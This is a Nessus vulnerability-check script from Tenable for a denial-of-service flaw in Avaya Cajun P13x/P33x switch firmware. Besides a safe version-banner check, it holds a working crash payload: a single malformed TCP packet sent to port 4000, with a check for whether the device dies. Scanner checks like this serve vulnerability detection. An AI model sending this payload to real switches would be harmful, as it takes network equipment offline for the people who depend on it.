#
# (C) Tenable Network Security
#
# THIS SCRIPT WAS NOT TESTED, so it might false negative.
# (it's about crashing the remote appliance though).
#
# Ref:
#  Date: Wed, 18 Jun 2003 19:16:03 +0200 (CEST)
#  From: Jacek Lipkowski <sq5bpf@andra.com.pl>
#  To: bugtraq@securityfocus.com
#  Subject: Denial of service in Cajun P13x/P33x switch family firmware 3.x



if(description)
{
 script_id(11759);
 script_version ("$Revision: 1.2 $");
 
 name["english"] = "Cajun p13x DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "
It was possible to crash the remote host by sending a 
a malformed string to port 4000.

An attacker may use this flaw to prevent the remote switch from
accomplishing its job properly.

Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Crashes a Cajun switch";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("snmp_sysDesc.nasl");
 script_require_ports(4000);
 exit(0);
}

#
# The script code starts here
#

if( safe_checks())
{

  banner = get_kb_item("SNMP/sysDesc");
  if( ! banner ) exit(0);

  if ("Avaya P130" >< banner )
  {
   if(egrep(pattern:"Avaya.*P130.*version .*",
     	    string:banner))security_hole(4000);

  }
  else if ("Avaya" >< banner && "P33" >< banner)
  {
   if(egrep(pattern:"Avaya.*P33[03].*version [0-3]\.", string:banner))
     	security_hole(4000);
  }
  exit(0);
}


port = 4000;
if(!get_port_state(port))exit(0);

start_denial();

soc = open_sock_tcp(4000);
if(!soc)exit(0);

send(socket:soc, data:raw_string(0x80) + "dupa");
close(soc);

alive = end_denial();					     
if(!alive){
  		security_hole(4000);
		set_kb_item(name:"Host/dead", value:TRUE);
		}
